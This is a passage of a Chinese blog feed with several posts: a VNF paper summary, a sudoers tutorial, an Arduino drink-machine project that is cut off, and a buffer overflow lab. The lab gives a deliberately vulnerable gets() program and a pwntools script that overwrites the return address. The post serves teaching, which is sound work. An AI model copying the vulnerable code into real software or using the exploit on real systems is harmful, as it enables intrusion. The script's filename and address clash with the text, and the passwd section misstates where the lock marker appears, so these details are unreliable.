id="The-effect-of-the-number-of-NFs"><a href="#The-effect-of-the-number-of-NFs" class="headerlink" title="The effect of the number of NFs"></a>The effect of the number of NFs</h3><p><img src="https://i.imgur.com/CqLQxDV.png"><br>最後，圖 8 顯示了所有三種算法的結果，網絡功能的數量從 10 到 55 不等<br>可以得出，成本也上升了。這是因為所有算法都需要在數據中心放置更多的 VNF 實例，從而導致部署成本的增加。同時，不同數據中心的網絡功能之間更多的網絡流量也會導致通信成本的增加。因此，總成本呈上升趨勢。<br>儘管如此，我們的RLX 的優勢始終可以在任何設置下觀察到，因為它優於SP 並接近OPT</p><h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>在本文中，我們研究了地理分佈式數據中心的 VNF 部署和網絡流量調度問題。我們進一步將此問題表述為混合整數線性規劃，目標是最小化總部署成本和通信成本。然後我們提出了一種低複雜度的基於鬆弛的算法來處理計算複雜度。大量基於模擬的性能評估結果表明，我們的算法具有更好的性能，可以有效降低各種場景下的總成本</p><h2 id="資料來源"><a href="#資料來源" class="headerlink" title="資料來源"></a>資料來源</h2><p><a href="https://ieeexplore.ieee.org/document/8422334">https://ieeexplore.ieee.org/document/8422334</a></p>]]></content>
      
      
      <categories>
          
          <category> 論文導讀 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Network </tag>
            
            <tag> VNF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>實驗緩衝區溢位漏洞 (Buffer Overflow)</title>
      <link href="/posts/Buffer_Overflow_Test.html"/>
      <url>/posts/Buffer_Overflow_Test.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><strong>緩衝區溢位漏洞（Buffer Overflow)</strong> 是軟體和系統安全領域中最常見且嚴重的安全漏洞之一。現今數位時代中複雜的軟體系統常常面臨著來自駭客或惡意使用者的威脅。緩衝區溢位漏洞便是這些威脅中最令人擔憂的一種，因其對計算機系統造成的威脅程度不可忽視。</p><p>簡單來說，緩衝區溢位漏洞是指當程式碼嘗試將資料存儲在一個預先定義大小的<strong>記憶體區塊（稱為緩衝區）</strong> 中時，若輸入的資料量超過了緩衝區所能容納的最大值，多餘的資料將會溢出到相鄰的記憶體區域，從而可能覆蓋控制程式執行的指令或資料，進而產生意料之外的行為。</p><p>造成緩衝區溢位漏洞的根本原因是程式設計上的疏忽與錯誤。當程式開發者<strong>未能正確處理使用者輸入的情況</strong>，特別是<strong>未能對輸入進行充分的驗證和限制</strong>，就可能引發這樣的漏洞。攻擊者通常會藉由傳送特製的惡意輸入數據，利用這些未經檢查的輸入，使程式遭受緩衝區溢位攻擊。這種攻擊手法已經存在多年，並且在歷史上造成了許多嚴重的安全事件。</p><p>過去，許多知名的緩衝區溢位漏洞被廣泛報導，其中一些甚至對全球資訊安全產生了深遠影響。例如，著名的 <code>Code Red</code> 和 <code>Nimda</code> 蠕蟲就是利用緩衝區溢位漏洞來快速感染數以萬計的主機。同樣的，<code>Slammer</code> 蠕蟲也是利用微軟SQL Server中的緩衝區溢位漏洞，導致了全球互聯網流量的瞬間飆升。這些事件提醒了整個科技業界必須高度重視緩衝區溢位漏洞的威脅。</p><blockquote><p>SQL Slammer - <a href="https://en.wikipedia.org/wiki/SQL_Slammer">https://en.wikipedia.org/wiki/SQL_Slammer</a></p></blockquote><p>所以這篇文章就來簡單的實驗一下緩衝區溢位漏洞，至少讓我有點概念。</p><h2 id="環境配置"><a href="#環境配置" class="headerlink" title="環境配置"></a>環境配置</h2><p>在環境配置方面，我們使用 <strong>Windows Subsystem for Linux (WSL)</strong> 平台來配置開發環境，並且使用 <code>Ubuntu 20.04 LTS</code> 作為開發環境。我們將在這個環境中安裝所需的工具，包括 <code>Python3</code>、<code>Pwntool</code>，以及用於進行 GDB 除錯 的 <code>PEDA</code> 插件。</p><p>WSL 提供了一個在 Windows 系統上運行 Linux 發行版的功能，讓我們能夠在 Windows 環境中進行 Linux 相關的開發工作。Ubuntu 20.04 LTS 是一個穩定且常見的 Linux 發行版，其廣泛應用於開發和測試環境。</p><p>在進行環境配置之前，我們需要確保已安裝並運行了 WSL。安裝 WSL 可以參考微軟官方文檔或相關的線上教程。</p><blockquote><p><a href="https://learn.microsoft.com/zh-tw/windows/wsl/install">https://learn.microsoft.com/zh-tw/windows/wsl/install</a></p></blockquote><p>接下來，我們需要在 WSL 中安裝 Python3 和 Pwntool。Pwntool 是在 CTF中很常見，特別針對漏洞利用開發的 Python 函式庫。</p><p>在安裝 Pwntool 前，我們需要確保 git 已經在 WSL 中安裝，若未安裝則可使用以下命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install git</span><br></pre></td></tr></table></figure><p>接下來，我們可以透過以下方法來安裝 Pwntool：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install python3 python3-pip</span><br><span class="line">pip3 install --upgrade pip</span><br><span class="line">pip3 install pwntools</span><br></pre></td></tr></table></figure><p>現在我們已經在 WSL 中完成 Python3 和 Pwntool 的安裝。</p><p>接下來，我們將配置 GDB DEBUG環境，使用 PEDA 插件來幫助我們進行緩衝區溢位漏洞的演練。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/longld/peda.git ~/peda</span><br><span class="line">echo &quot;source ~/peda/peda.py&quot; &gt;&gt; ~/.gdbinit</span><br></pre></td></tr></table></figure><p>最後，這裡提供了一個簡單的 C 程式 <code>buffer_test.c</code> 作為我們實際演示緩衝區溢位漏洞的目標。該程式包含了一個 <code>uname()</code> 函數，其中使用了 <code>gets()</code> 函數來接收使用者輸入，但是未對輸入進行足夠的驗證，從而可能引發緩衝區溢位漏洞。</p><p>buffer_test.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">target</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Oh No! Your Hacker.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">uname</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> str[<span class="number">16</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;input your name: \n&quot;</span>);</span><br><span class="line">    gets(str);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello, %s \n&quot;</span>, str);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);  <span class="comment">//清除暫存</span></span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    uname();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><div class="note info flat"><p>程式中含有危險輸入函式 <strong>gets</strong> ，作為 Buffer Overflow的練習程式</p></div><h2 id="實驗步驟"><a href="#實驗步驟" class="headerlink" title="實驗步驟"></a>實驗步驟</h2><h3 id="一、-編譯程式"><a href="#一、-編譯程式" class="headerlink" title="一、 編譯程式"></a>一、 編譯程式</h3><p>首先，我們需要編譯名為 <code>buffer_test.c</code> 的程式碼，以便進行後續的實驗。編譯時我們需要關閉 <strong>Stack Canary</strong> 的防護機制，可以使用以下指令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc buffer_test.c -o buffer_test -fno-stack-protector -no-pie</span><br></pre></td></tr></table></figure><div class="note info flat"><p><code>-fno-stack-protector</code> ：關閉 Stack Canary 的防護機制</p></div><h2 id="二、-檢查防護措施"><a href="#二、-檢查防護措施" class="headerlink" title="二、 檢查防護措施"></a>二、 檢查防護措施</h2><p>在實驗開始前，需要確認目標程式的安全防護機制。可以用 &#96;checksec 指令可以快速查看目標執行檔的相關安全措施：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">checksec buffer_test</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/HuO3k3R.png"></p><h2 id="三、-確認目標："><a href="#三、-確認目標：" class="headerlink" title="三、 確認目標："></a>三、 確認目標：</h2><p>在進行攻擊之前，需要先確認目標。在這個實驗中，我們的目標是執行 &#96;target 函式，因此需要找到該函式的記憶體位址，並蓋過函式返回位址。</p><h2 id="四、確認函式記憶體位址"><a href="#四、確認函式記憶體位址" class="headerlink" title="四、確認函式記憶體位址"></a>四、確認函式記憶體位址</h2><p>透過 GDB 來查詢 <code>target</code> 函式的記憶體位址：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb buffer_test</span><br><span class="line"><span class="meta prompt_">gdb-peda$ </span><span class="language-bash">disas target</span></span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/l1S7BAX.png"></p><p>從上圖可得知，此function開始的位址在 <code>0x0000000000401196</code><br>得知了函式位址後，接著要知道如何從 input 蓋到 ret</p><h2 id="五、測試"><a href="#五、測試" class="headerlink" title="五、測試"></a>五、測試</h2><p>在實際進行攻擊之前，我們先在 GDB 中執行程式，並觀察它的行為：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">gdb-peta$ </span><span class="language-bash">r    //先跑跑看</span></span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/jdWT4BI.png"></p><p>程式會要求使用者輸入名字，並在名字輸入完畢後回應 <code>Hello, &#123;name&#125;</code>。由於原程式中容納使用者輸入的陣列只有 16 個位元組（<code>RBP ~ RBP-16</code>），<strong>所以我們可以透過輸入超過 16 個位元組的資料來觀察它的行為。</strong></p><p><img src="https://i.imgur.com/HOnCJiX.png" alt="Imgur"></p><p>如圖所示，當輸入超過 24 個位元組時，程式就會發生緩衝區溢位，並且在字元 v 後就發生崩潰。這表示我們需要至少 24 個位元組的輸入，才能成功蓋過函式返回位址。</p><blockquote><p>所以再 <code>8Bytes</code> 即可蓋完 ret address</p></blockquote><blockquote><p>RBP 那顯示只到 qrstuvwx，意思就是輸到24byte就爆了</p></blockquote><h2 id="六、實際用-Python-來覆蓋"><a href="#六、實際用-Python-來覆蓋" class="headerlink" title="六、實際用 Python 來覆蓋"></a>六、實際用 Python 來覆蓋</h2><p>為了進行實際的攻擊，將使用 Python 撰寫攻擊腳本。這個腳本將使用 <code>Pwntools</code> 函式庫來進行攻擊，蓋過程式中的函式返回位址，使之執行 <code>target</code> 函式。</p><p>攻擊腳本 attack.py 如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = process(<span class="string">&#x27;./demo&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;input your name:&#x27;</span>) </span><br><span class="line">targer_address = p64(<span class="number">0x400667</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;A&#x27;</span> * <span class="number">24</span> + targer_address)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>在攻擊腳本中，我們使用 <code>process()</code> 函式來執行 buffer_test 程式。接著，透過 <code>recvuntil()</code> 函式等待程式顯示 <strong>“input your name:”</strong> 的提示，然後將我們事先計算好的 <code>target</code> 函式位址加入到輸入資料中。最後，使用 <code>interactive()</code> 函式進入互動模式，以便觀察攻擊的結果。</p><ul><li><p><code>recvuntil()</code>：receive until，可接收特定字串，當到達目標字串時，執行xx指令</p></li><li><p><code>p8()</code>、<code>p32()</code>、<code>p64()</code></p><p> <img src="https://i.imgur.com/HZzm1tq.png"></p><ul><li><code>p32</code>：對data 打包 (32bit  integer)  &#x2F;&#x2F;u32：解包</li><li><code>p64</code>：對 data 打包 (64bit integer)  &#x2F;&#x2F;u64 :解包<br>轉成位址</li></ul></li><li><p><code>sendline(payload)</code>：發送payload，並換行</p></li><li><p><code>interactive()</code>：進入交互模式，可用來執行本地或遠端執行檔</p></li></ul><h2 id="七、-執行攻擊腳本"><a href="#七、-執行攻擊腳本" class="headerlink" title="七、 執行攻擊腳本"></a>七、 執行攻擊腳本</h2><p>最後，我們執行攻擊腳本以進行攻擊：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 attack.py</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/Hr1LHfQ.png"></p><p>攻擊成功後，程式將會執行 <code>target</code> 函式，並顯示 “Oh No! Your Hacker.” 的訊息，證明我們成功地利用緩衝區溢位漏洞進行了攻擊。</p><div class="note success flat"><p>成功執行target函式!</p></div><div class="note warning flat"><p>請記得在實際環境中應用所學的知識時，確保遵守相關法律法規，並僅在合法授權的情況下進行安全測試與漏洞利用。</p></div><h2 id="參考資料"><a href="#參考資料" class="headerlink" title="參考資料"></a>參考資料</h2><p><a href="https://mks.tw/2976/%e8%b3%87%e8%a8%8a%e5%ae%89%e5%85%a8-%e5%be%9e%e6%af%ab%e7%84%a1%e5%9f%ba%e7%a4%8e%e9%96%8b%e5%a7%8b-pwn-buffer-overflow">https://mks.tw/2976/%e8%b3%87%e8%a8%8a%e5%ae%89%e5%85%a8-%e5%be%9e%e6%af%ab%e7%84%a1%e5%9f%ba%e7%a4%8e%e9%96%8b%e5%a7%8b-pwn-buffer-overflow</a></p>]]></content>
      
      
      <categories>
          
          <category> 實作紀錄 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Reverse </tag>
            
            <tag> Security </tag>
            
            <tag> Linux </tag>
            
            <tag> Buffer Overflow </tag>
            
            <tag> exploit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>提升Linux系統管理技能：掌握SUDO權限配置和帳戶設定</title>
      <link href="/posts/555098e9.html"/>
      <url>/posts/555098e9.html</url>
      
        <content type="html"><![CDATA[<p>當我們在Linux系統中運行一般使用者帳戶時，有時會需要執行需要超級用戶權限的指令，例如更新軟體包或下載檔案等。然而，如果一般使用者沒有被授予sudo權限，就無法執行這些指令。<strong>為了讓一般使用者能夠使用sudo指令，我們需要進行sudoers設定</strong>。</p><p>這裡將介紹如何配置sudo權限以及其他有趣的帳戶存取相關的設定。</p><h1 id="sudoers設定檔"><a href="#sudoers設定檔" class="headerlink" title="sudoers設定檔"></a>sudoers設定檔</h1><p>在Linux系統中，可以使用sudoers設定檔來指定使用者、群組或別名的sudo權限。該設定檔通常位於<code>/etc/sudoers</code>。</p><p><img src="https://i.imgur.com/EcE7ix5.png"></p><p>然而，為了避免對sudoers設定檔進行錯誤的更改，我們應該使用 <code>visudo</code> 指令來編輯設定檔。</p><p><code>visudo</code> 在保存設定時會檢查是否存在錯誤的配置，例如錯誤的權限或語法問題。請注意，sudoers設定檔只能使用 <code>visudo</code> 指令來編輯，如果直接使用vim等編輯器，可能會遇到唯讀或無法覆寫的問題，會跳出 <strong>read-only，cannot override.</strong></p><p>可以使用以下命令來打開sudoers設定檔進行編輯：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo visudo</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/rqL2ZNl.png"></p><p>一旦打開了設定檔，可以在root行下方添加新的配置，指定要授予哪個使用者或群組什麼樣的權限。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root  ALL=(ALL:ALL) ALL</span><br><span class="line">[user 帳號] [user的來源主機]=([可切換的身份])[可執行的指令]</span><br></pre></td></tr></table></figure><h1 id="其他有趣的帳戶存取設定"><a href="#其他有趣的帳戶存取設定" class="headerlink" title="其他有趣的帳戶存取設定"></a>其他有趣的帳戶存取設定</h1><h3 id="passwd-參數-l"><a href="#passwd-參數-l" class="headerlink" title="passwd 參數 -l"></a>passwd 參數 -l</h3><p><img src="https://i.imgur.com/NUH03vf.png"></p><p><code>passwd</code>  命令的-l參數用於鎖定帳戶密碼。<strong>當我們鎖定帳戶密碼時，系統會將密碼的雜湊值(放在 &#x2F;etc&#x2F;shadow )更改為系統中尚未使用的值。</strong> 鎖定的密碼在 <code>/etc/passwd</code> 檔案中的密碼雜湊值前面顯示一個驚嘆號(!)。因此，當我們使用以下命令鎖定帳戶密碼時：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd -l</span><br></pre></td></tr></table></figure><p>其他使用者使用sudo su等指令時，將無法切換為root用戶。<br>此外，我們可以使用chsh命令來更改帳戶的shell。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo chsh root</span><br><span class="line">chsh [user/root]</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/DHCIuI0.png"></p><p>上面的截圖顯示了passwd命令的輸出，其中root用戶的預設shell是 <code>/bin/bash</code>。<br>另外，而可以觀察到其他很多都是 <code>/usr/sbin/nologin</code>，這表示在本地或遠端都無法使用這個帳戶登錄。因此，如果將root的shell更改為 <code>/usr/sbin/nologin</code>，則沒有人可以訪問root帳戶。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo chsh root</span><br><span class="line">/usr/sbin/nologin</span><br></pre></td></tr></table></figure><p>以上是有關配置sudo權限和更改帳戶shell的一些技巧。<br>透過這些設定，我們可以更好地管理Linux系統上的使用者權限和安全性。</p>]]></content>
      
      
      <categories>
          
          <category> 學習筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Security </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019通訊系畢業專題</title>
      <link href="/posts/4b76a41f.html"/>
      <url>/posts/4b76a41f.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://i.imgur.com/O3Xs5VC.jpg"></p><h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>老實說一開始選擇教授時，並沒有想太多，只想找涼的教授，我記得當時的考量是 「對我們學校來說還是考研趕快換學校重要」因此沒有挑戰硬一點的主題&#x2F;教授 XD。所以最後我找了全系最涼的教授，專題主題每年都只定Arduino(原因應該是省錢又省時，也不太需要教)，6個專題生分成3組，每組2人。</p><p><strong>「Arduino + APP 遠端遙控」</strong>，其他主題包裝自己想。<br>既然技術簡單、架構清楚，看來要比的是創意和想法了~~~。在某一天的午後，我和組員要去買飲料，突然靈機一動，要是市面上手搖杯和飲料都能自動調配和無線操控，應該蠻不錯的喔！！！<br>因此我們的專題 「Smart Drinks 智慧飲料機」誕生了。</p><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>我們將想達成的目標簡單分成幾個 part，來一一解決<br>APP + Wifi連接 + 移動飲料的方法 + 飲料機身<br>由於移動、調配飲料的方法是關鍵，會影響到整題機身設計<br>所以我們先設計調飲料方法(怎麼做，怎麼設計)。</p><h3 id="取料、調配方法"><a href="#取料、調配方法" class="headerlink" title="取料、調配方法:"></a>取料、調配方法:</h3><p>我們打算透過一個容器來裝載飲料原料，讓容器底部開孔，而底部之下黏一個紙板，紙板也開孔，但容器孔和紙板孔先不對齊，由servo motor來控制旋轉角度，進而使紙板孔和容器孔對齊，內容物則會自然落下。</p><p><img src="https://i.imgur.com/BdtsD1G.jpg"></p><p>所以這種取料方式，容器必須有一定高度，因此機身設計必須考慮這點。那可想而知，飲料杯必須在底部移動，進行取料，最後還要加水。</p><h3 id="移動方式："><a href="#移動方式：" class="headerlink" title="移動方式："></a>移動方式：</h3><p>設計 X、Y軸滑台(類似夾娃娃機上方的移動橫桿)，來讓飲料杯進行前後，左右的移動。<br>在大致規劃好要怎麼取料移動後，著手進行機身的設計</p><h3 id="機身設計："><a href="#機身設計：" class="headerlink" title="機身設計："></a>機身設計：</h3><p>透過便宜又環保的松木層板來進行裁切和組裝</p><p><img src="https://i.imgur.com/7CoF2dM.jpg"></p><p>由於沒有過木工經驗，耗費許久時間在木工上(木工已加入工具人skill set內)XD。 接著實作上方的取料罐和伺服馬達：</p><ul><li>取料罐：隨便一個罐子(有蓋)，將底部開洞，紅色蓋子處也開洞(洞口可自行設計形狀)</li></ul><p><img src="https://i.imgur.com/gWqliC7.jpg"></p><p>接著將紙板或珍珠板開略大於紅色蓋子孔的扇形洞，並透過小螺絲穿過紙板和容器板(以方便轉動)</p><ul><li>伺服馬達: 固定於上層層版側面，並與紙板相黏</li></ul><p><img src="https://i.imgur.com/Xze3y4W.jpg"></p><p>為了防止servo motor轉動時容器跟著轉動，用熱溶膠固定鐵絲和取料罐在層板上</p><p><img src="https://i.imgur.com/RGGwRKY.jpg"></p><p>這樣取料罐架構基本上就完成了，接著就重複3次，因為我們設了3個取料罐<br>開始實作最麻煩的X、Y軸滑台：<br>材料：步進馬達 x 2、螺旋軸 x 2(或直接去網購 絲軸)、軸承座 x 4、束帶、培林 x2、鐵桿 x 2<br>裁好合適的木頭並鑽孔放入鐵桿和 螺旋軸+ 步進馬達(*放入螺旋軸前須放入培林，避免螺旋軸轉動時將木板轉出來)，最後放入軸承座來乘載X軸，x軸做法同上。</p><iframe width="820" height="500" src="https://www.youtube.com/embed/atkGcfnsK3A" title="How to Make Homework Writing Machine at home" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe><p>我們碰到最大的問題是：X軸太重，難以支撐，因此整個軸承座會卡住，南以轉動，後臨時透過小型玩具車來支撐解決這個問題</p><p><img src="https://i.imgur.com/gPWebQS.jpg"></p><blockquote><p>這樣飲料機身部分也完成了！！</p></blockquote><h3 id="硬體接線部分："><a href="#硬體接線部分：" class="headerlink" title="硬體接線部分："></a>硬體接線部分：</h3><p><img src="https://i.imgur.com/KmXl0AO.png"></p><p>所用元件： </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">- NodeMCU</span><br><span class="line">- Arduino Mega板</span><br><span class="line">- L298N x 2</span><br><span class="line">- 4-channel relay</span><br><span class="line">- 1-channel relay</span><br><span class="line">- servo x4</span><br><span class="line">- stepper motor x2</span><br><span class="line">- 沉水馬達 x2</span><br><span class="line">- power supply(可改用多個電池盒)</span><br></pre></td></tr></table></figure><p>想法：透過NodMCU接收指令來操控4個繼電器開關，每個繼電器又分別接到Arduino板電源，每個Arduino板對應一種飲料，預先燒好的code在Arduino內，電源開啟時則會自動執行取料和飲料調配程式。</p><p>ps. 上圖有只有實作一個Arduino板<br>ps.每個Arduino板必須在連到一個控制沉水馬達的繼電器上</p><p><img src="https://i.imgur.com/u38OXhA.jpg"></p><p>水管的位置會是飲料放置的起始點和終點(取原料回原位加水)</p><p><img src="https://i.imgur.com/hJ1RbRy.jpg"></p><p>NodeMCU 接線:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">- 4路繼電器</span><br><span class="line">- 分別接到4個Arduino電源孔</span><br><span class="line">- 4個Arduino 板分別將L298N 控制接腳接出來，分別控制滑台XY軸</span><br><span class="line">- 4個Arduino 其他pin 腳接出來控制4個 servo motor</span><br><span class="line">- 4個Arduino 某pin腳出來 接出來到沉水馬達訊號線。</span><br></pre></td></tr></table></figure><blockquote><p>注意電壓分配</p></blockquote><p>Arduino程式部分:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">Arduino程式部分：</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Stepper.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Servo.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STEPS 200 <span class="comment">//定義步進馬達每圈的步數</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WATER 24 <span class="comment">//抽水馬達腳位</span></span></span><br><span class="line"><span class="comment">//steps:代表馬達轉完一圈需要多少步數。如果馬達上有標示每步的度數，</span></span><br><span class="line"><span class="comment">//將360除以這個角度，就可以得到所需要的步數(例如：360/3.6=100)。</span></span><br><span class="line">Stepper <span class="title function_">Y</span><span class="params">(STEPS, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>)</span>;</span><br><span class="line">Stepper <span class="title function_">X</span><span class="params">(STEPS, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>)</span>;</span><br><span class="line">Servo goal;</span><br><span class="line"><span class="type">int</span> pos;</span><br><span class="line"><span class="type">void</span> <span class="title function_">setup</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"> goal.attach(<span class="number">12</span>);</span><br><span class="line"> goal.write(<span class="number">0</span>);</span><br><span class="line"> X.setSpeed(<span class="number">160</span>); <span class="comment">// 將馬達的速度設定成140RPM 最大 150~160</span></span><br><span class="line"> Y.setSpeed(<span class="number">160</span>); <span class="comment">// 電壓7.5V</span></span><br><span class="line"> pinMode(WATER,OUTPUT);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">loop</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"> </span><br><span class="line"> <span class="comment">// Y.step(17000);//+向內 - 向外 //可可:17000 //奶茶: 17000 //茶:無</span></span><br><span class="line"> delay(<span class="number">500</span>);</span><br><span class="line"> X.step(<span class="number">-24000</span>);<span class="comment">//向內 //可可:-7500 //奶茶:-20000 //茶: -20000</span></span><br><span class="line"> delay(<span class="number">1000</span>);</span><br><span class="line"> <span class="keyword">for</span> (pos = <span class="number">0</span>; pos &lt;= <span class="number">120</span>; pos += <span class="number">1</span>) &#123; <span class="comment">//可可:140 //奶茶: 40 //茶:120</span></span><br><span class="line"> goal.write(pos); </span><br><span class="line"> delay(<span class="number">15</span>); </span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">for</span> (pos = <span class="number">120</span>; pos &gt;= <span class="number">0</span>; pos -= <span class="number">1</span>) &#123; </span><br><span class="line"> goal.write(pos); </span><br><span class="line"> delay(<span class="number">15</span>); </span><br><span class="line"> &#125;</span><br><span class="line"> delay(<span class="number">1000</span>);</span><br><span class="line"> X.step(<span class="number">22000</span>); </span><br><span class="line"> <span class="comment">// delay(500);</span></span><br><span class="line"> <span class="comment">// Y.step(-17000);</span></span><br><span class="line"> delay(<span class="number">1000</span>);</span><br><span class="line"> digitalWrite(WATER, HIGH);</span><br><span class="line"> delay(<span class="number">5000</span>);</span><br><span class="line"> digitalWrite(WATER, LOW);</span><br><span class="line"> delay(<span class="number">5000</span>);</span><br><span class="line"><span class="comment">//while(1) &#123; &#125;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果想要取後排的飲料，就必須，先移動Y軸到後排再移動X軸到定點，接著servo 